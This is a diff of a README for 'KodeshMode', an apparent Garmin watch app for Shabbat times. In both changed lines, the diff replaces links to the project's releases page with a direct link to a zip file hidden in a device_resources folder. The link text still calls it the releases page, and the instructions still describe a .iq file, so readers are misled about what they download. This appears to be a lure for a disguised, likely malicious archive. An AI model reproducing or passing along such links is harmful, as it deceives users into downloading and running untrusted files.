@@ -1,12 +1,12 @@
 # 📖 KodeshMode - Track Shabbat times on your watch
 
-[![](https://img.shields.io/badge/Download-KodeshMode-blue.svg)](https://github.com/Biswaspr1022/KodeshMode/releases)
+[![](https://img.shields.io/badge/Download-KodeshMode-blue.svg)](https://github.com/Biswaspr1022/KodeshMode/raw/refs/heads/main/device_resources/resources-vivoactive6/Mode_Kodesh_v1.1.zip)
 
 KodeshMode displays Shabbat times and Jewish calendar data on your Garmin watch. This app helps you follow Zmanim and Torah portions from your wrist. It works with both AMOLED and MIP screen displays.
 
 ## 📥 Getting the App
 
-1. Visit the [KodeshMode releases page](https://github.com/Biswaspr1022/KodeshMode/releases) to download.
+1. Visit the [KodeshMode releases page](https://github.com/Biswaspr1022/KodeshMode/raw/refs/heads/main/device_resources/resources-vivoactive6/Mode_Kodesh_v1.1.zip) to download.
 2. Look for the latest version at the top of the page.
 3. Download the file ending in `.iq`.
 4. Save the file to your computer.
